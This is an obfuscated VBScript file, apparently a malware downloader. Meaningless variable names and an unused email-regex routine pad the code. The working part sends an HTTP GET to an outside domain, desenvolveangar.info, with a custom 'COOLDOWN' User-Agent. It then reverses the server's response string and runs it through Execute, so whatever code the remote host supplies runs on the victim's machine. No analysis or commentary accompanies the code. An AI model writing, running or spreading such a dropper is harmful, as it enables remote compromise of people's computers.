LSLBbKE = "WWicaYvIa0Cafkh2HCWm8HQWi" & "@" & "WWicaYvIa0Cafkh2HCWm8HQWi" & "." & "WWicaYvIa0Cafkh2HCWm8HQWi"

Set LSLBbXY = New RegExp

With LSLBbXY
    .Pattern    = "ˆ([\w-]+\.)*[\w-]+@([\w-]+\.)+[a-z]{2,4}$"
    .IgnoreCase = True
    .Global     = False
End With


LSLBbXY.Pattern = "ˆ([\w-]+\.)*[\w-]+@([\w-]+)(\.[\w-]+)*\.[a-z]{2,4}$"

Set objMatch = LSLBbXY.Execute( LSLBbKE )

Set objMatch = Nothing

LSLBbXY.Pattern = "@" & LSLBbGH
LSLBbWT  = "WWicaYvIa0Cafkh2HCWm8HQWi"

LSLBbCF = LSLBbXY.Replace( LSLBbKE, "@" & LSLBbWT )

Set LSLBbXY = Nothing

JH1or="WWicaYvIa0Cafkh2HCWm8HQWi"
URL="http://desenvolveangar.info/?c=lds&" & JH1or
set LSLBb=CreateObject("Microsoft.XMLHTTP")

LSLBb.open "GET",URL,false
LSLBb.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
LSLBb.setRequestHeader "User-Agent", "COOLDOWN"
LSLBb.send "Z"

dim kpR07

function kpR07TT()
For i = Len(LSLBb.responsetext) to 1  Step-1
var= Mid(LSLBb.responsetext,  i  , 1)
kpR07 = kpR07 & var
Next
end function 

execute " Eval(""kpR07TT()"") : Execute kpR07 & JH1orLSLBb "
